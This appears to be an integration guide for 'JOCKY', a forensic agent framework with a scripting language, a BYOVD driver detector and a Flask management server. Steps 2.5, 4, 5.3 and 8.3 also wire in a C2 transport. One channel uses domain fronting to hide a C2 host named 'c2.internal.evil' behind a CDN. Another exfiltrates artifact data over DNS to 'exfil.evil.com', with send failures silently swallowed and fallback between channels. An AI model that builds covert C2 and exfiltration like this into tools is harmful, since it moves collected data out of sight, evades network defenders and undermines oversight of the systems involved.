# JOCKY Integration Guide

This guide explains how to integrate the six new components into the existing JOCKY architecture.

## Step 1: Copy Files to Project

Copy the six new components to your JOCKY project:

```bash
# Copy the entire outputs/ directory into your jocky_project/
cp -r jocky/         jocky_project/jocky/
cp -r agent/modules/ jocky_project/agent/modules/
cp -r c2/            jocky_project/c2/
cp -r management/    jocky_project/management/
cp -r rules/         jocky_project/rules/

# Or individual files:
cp jocky/*.py        jocky_project/jocky/
cp agent/artifacts.py   jocky_project/agent/
cp c2/transport.py   jocky_project/c2/
cp management/*.py   jocky_project/management/
```

## Step 2: Update orchestrator.py

### 2.1 Add to _MODULE_REGISTRY

Find the existing `_MODULE_REGISTRY` dictionary and add:

```python
_MODULE_REGISTRY = {
    # ── Windows (existing) ────────────────────────────────
    "mft_acquire":         "agent.modules.mft_acquire",
    "mft_forensics":       "agent.modules.mft_parser",
    "evtx_collector":      "agent.modules.evtx_collector",
    "usn_parser":          "agent.modules.usn_parser",
    "rule_engine":         "agent.modules.rule_engine",
    
    # ── Linux (existing) ───────────────────────────────────
    "linux_syslog_collector": "agent.modules.linux_syslog_collector",
    "linux_fs_timeline":       "agent.modules.linux_fs_timeline",
    "linux_proc_snapshot":     "agent.modules.linux_proc_snapshot",
    "linux_persistence_scan":  "agent.modules.linux_persistence_scan",
    
    # ── NEW ────────────────────────────────────────────────
    "byovd_detector":      "agent.modules.byovd_detector",  # Add this line
}
```

### 2.2 Update _SCANNABLE_KINDS

Add byovd_hit to the set of scannable artifact kinds:

```python
_SCANNABLE_KINDS = {
    # Windows (existing)
    "mft_resident_data",
    "mft_slack",
    "memory_region",
    "usn_timeline",
    
    # Linux (existing)
    "linux_persistence_blob",
    "linux_proc_list",
    
    # NEW
    "byovd_hit",  # Add this line
}
```

### 2.3 Import C2Transport

Add at the top of orchestrator.py:

```python
import json  # Add if not present
from c2.transport import C2Transport
```

### 2.4 Update run_task() Signature

Change the function signature to accept c2_transport:

```python
def run_task(
    manifest: dict,
    case_id: str,
    agent: str,
    c2_transport: object = None
) -> dict:
```

### 2.5 Add C2 Send at End of run_task()

Before the final `return` statement in `run_task()`, add:

```python
    # ... existing code ...
    
    result_dict = {
        "case_id":         case_id,
        "agent":           agent,
        "modules":         module_summaries,
        "total_artifacts": len(ledger),
    }

    # ── NEW: Send results via C2Transport if configured ────
    if c2_transport:
        try:
            payload = json.dumps({
                "task_id": manifest.get("task_id"),
                "case_id": case_id,
                "agent_id": agent,
                "result": result_dict,
                "artifacts_count": len(ledger)
            }).encode()
            c2_transport.send(payload)
        except Exception:
            # Silent failure for C2 send
            pass
    
    return result_dict
```

## Step 3: Deploy Management Server

### 3.1 Start the Server

```bash
# Set environment variables
export JOCKY_SECRET="your-secret-key-here"
export JOCKY_DB="jocky.db"
export JOCKY_PORT="5000"
export JOCKY_DEBUG="false"

# Ensure Flask and PyJWT are installed
pip install flask pyjwt cryptography

# Run the server
python management/server.py
```

The server will:
- Create `jocky.db` SQLite database automatically
- Initialize schema (agents, cases, artifacts, findings)
- Listen on 0.0.0.0:5000

### 3.2 Open Dashboard

Navigate to:
```
http://localhost:5000/dashboard.html
```

(Note: Dashboard fetches from /cases and /cases/<id>/findings - no dedicated route needed)

## Step 4: Configure C2 Transport

### 4.1 CDN Fronting Setup

```python
from c2.transport import C2Transport

# Create transport for CDN fronting
transport = C2Transport(
    channel="cdn_fronting",
    cdn_host="cdn.example.com",      # Real CDN hostname
    real_host="c2.internal.evil",    # Hidden C2 in Host header
    shared_secret="pre-shared-secret"
)

# Use in run_task()
result = run_task(manifest, case_id, agent_id, c2_transport=transport)

# Or poll for tasks
incoming_task = transport.poll()
```

### 4.2 DNS Exfiltration Setup

```python
transport = C2Transport(
    channel="dns_exfil",
    dns_domain="exfil.evil.com",
    shared_secret="pre-shared-secret"
)

# Exfil only (no polling)
transport.send(artifact_data)
```

## Step 5: Agent Registration & Task Execution

### 5.1 Register Agent with Management Server

```python
import requests
import socket
import sys

response = requests.post("http://c2-server:5000/agent/register", json={
    "agent_id": "forensic-box-01",
    "platform": sys.platform,
    "hostname": socket.gethostname()
})

data = response.json()
jwt_token = data["token"]
agent_token = data["agent_token"]
```

### 5.2 Poll for Tasks

```python
import requests

headers = {"Authorization": f"Bearer {jwt_token}"}

# Poll management server
response = requests.get("http://c2-server:5000/agent/task", headers=headers)

if response.status_code == 200:
    manifest = response.json()
    print(f"Got task: {manifest['task_id']}")
elif response.status_code == 204:
    print("No tasks available")
```

### 5.3 Execute Task and Send Results

```python
from orchestrator import run_task
from c2.transport import C2Transport
import json

# Configure C2 transport
transport = C2Transport(
    channel="cdn_fronting",
    cdn_host="cdn.example.com",
    real_host="c2.evil",
    shared_secret="shared_secret"
)

# Execute the task
result = run_task(manifest, case_id, agent_id, c2_transport=transport)

# Send to management server
response = requests.post(
    "http://c2-server:5000/agent/result",
    headers=headers,
    json={
        "case_id": case_id,
        "ledger": result["artifacts"]  # Pass full artifact list
    }
)

print(f"Result submission: {response.json()}")
```

## Step 6: Create and Deploy Cases

### 6.1 Using the REST API

```bash
# Authenticate
JWT=$(curl -s -X POST http://localhost:5000/agent/register \
  -H "Content-Type: application/json" \
  -d '{"agent_id":"test","platform":"linux","hostname":"test"}' \
  | jq -r .token)

# Create a case with the full manifest
curl -X POST http://localhost:5000/cases \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  -d @task_manifest_full.json

# Get case list
curl -X GET http://localhost:5000/cases \
  -H "Authorization: Bearer $JWT"

# Get findings for a case
curl -X GET http://localhost:5000/cases/comprehensive_dfir_sweep_001/findings \
  -H "Authorization: Bearer $JWT"
```

### 6.2 Programmatically

```python
import requests
import json

headers = {"Authorization": f"Bearer {jwt_token}"}

# Load manifest
with open("task_manifest_full.json") as f:
    manifest = json.load(f)

# Create case
response = requests.post(
    "http://localhost:5000/cases",
    headers=headers,
    json={
        "case_id": "dfir_sweep_prod_001",
        "manifest": manifest
    }
)

print(f"Case deployed to {response.json()['agents_deployed']} agents")
```

## Step 7: Verify Integration

### 7.1 Test Lexer & Parser

```bash
python3 << 'EOF'
from jocky.parser import parse

code = """
def analyze(artifacts):
    for a in artifacts:
        if a["level"] == "critical":
            print(a["id"])
"""

ast = parse(code)
print(f"Parsed {len(ast.statements)} statement(s)")
EOF
```

### 7.2 Test Compiler

```bash
python3 << 'EOF'
from jocky.compiler import compile_jck

bytecode = compile_jck("x = 10 + 5")
print(f"Bytecode size: {len(bytecode)} bytes")
print(f"Magic: {bytecode[:4]}")
EOF
```

### 7.3 Test BYOVD Detector

```bash
python3 << 'EOF'
from agent.modules.byovd_detector import Module

detector = Module()
result = detector.run({
    "vuln_db": "rules/byovd.json",
    "out_dir": "/tmp"
})

print(f"Hits: {len(result.artifacts)}")
print(f"Anomalies: {len(result.anomalies)}")
EOF
```

### 7.4 Test Management Server

```bash
python3 << 'EOF'
import requests

# Health check
r = requests.get("http://localhost:5000/health")
print(f"Server status: {r.json()}")
EOF
```

## Step 8: Advanced Configuration

### 8.1 Custom BYOVD Database

Update rules/byovd.json with your organization's vulnerable drivers:

```json
{
  "your_driver.sys": {
    "hash": "sha256_hash_here",
    "cves": ["CVE-YYYY-XXXXX"],
    "severity": "critical"
  }
}
```

### 8.2 Custom Sigma/YARA Rules

Create rules in:
- `rules/sigma/` - Sigma rules for log detection
- `rules/yara/` - YARA rules for artifact scanning

### 8.3 Multiple C2 Channels

Agents can switch channels dynamically:

```python
# Try CDN first, fall back to DNS
transport_primary = C2Transport(channel="cdn_fronting", ...)
transport_backup = C2Transport(channel="dns_exfil", ...)

if not transport_primary.send(payload):
    transport_backup.send(payload)
```

## Troubleshooting

### Management Server Won't Start
```bash
# Check database
sqlite3 jocky.db ".tables"

# Delete corrupted DB and restart
rm jocky.db
python management/server.py
```

### Agents Can't Register
```bash
# Verify JOCKY_SECRET is set and consistent
echo $JOCKY_SECRET

# Check server is running
curl http://localhost:5000/health

# Verify network connectivity
curl -v http://localhost:5000/agent/register
```

### bytecode VM Errors
```bash
# Enable debug mode
python3 -c "
from jocky.vm import JockyVM
vm = JockyVM(bytecode)
try:
    vm.execute()
except Exception as e:
    print(f'VM Error: {e}')
"
```

### C2 Transport Failures
```bash
# Test connectivity
python3 << 'EOF'
import socket
sock = socket.create_connection(("cdn.example.com", 443), timeout=5)
print("Connected!")
sock.close()
EOF
```

## Performance Tuning

### Database Optimization
```sql
-- Create indexes for faster queries
CREATE INDEX idx_artifacts_case ON artifacts(case_id);
CREATE INDEX idx_artifacts_agent ON artifacts(agent_id);
CREATE INDEX idx_findings_case ON findings(case_id);
CREATE INDEX idx_findings_level ON findings(level);
```

### VM Optimization
```python
# Pre-compile JOCKY scripts and cache bytecode
cache = {}

def execute_script(name, source):
    if name not in cache:
        from jocky.compiler import compile_jck
        cache[name] = compile_jck(source)
    return execute_bytecode(cache[name])
```

### Server Scaling
```bash
# Use Gunicorn for production
pip install gunicorn
gunicorn -w 4 -b 0.0.0.0:5000 management.server:app

# Or with uWSGI
pip install uwsgi
uwsgi --http :5000 --wsgi-file management/server.py --callable app
```

---

## Final Checklist

- [ ] Copy all 6 new components to project
- [ ] Update `_MODULE_REGISTRY` in orchestrator.py
- [ ] Update `_SCANNABLE_KINDS` in orchestrator.py
- [ ] Import C2Transport in orchestrator.py
- [ ] Modify `run_task()` to accept and use c2_transport
- [ ] Install Flask, PyJWT, cryptography
- [ ] Start management server with JOCKY_SECRET
- [ ] Register test agent
- [ ] Create test case and deploy
- [ ] View dashboard at localhost:5000/dashboard.html
- [ ] Verify findings appear in dashboard

---

## References

- `README.md` - Component documentation
- `task_manifest_full.json` - Complete task pipeline
- `rules/byovd.json` - BYOVD database
- `orchestrator_patch.py` - Full patch code
- Individual component docstrings in source files

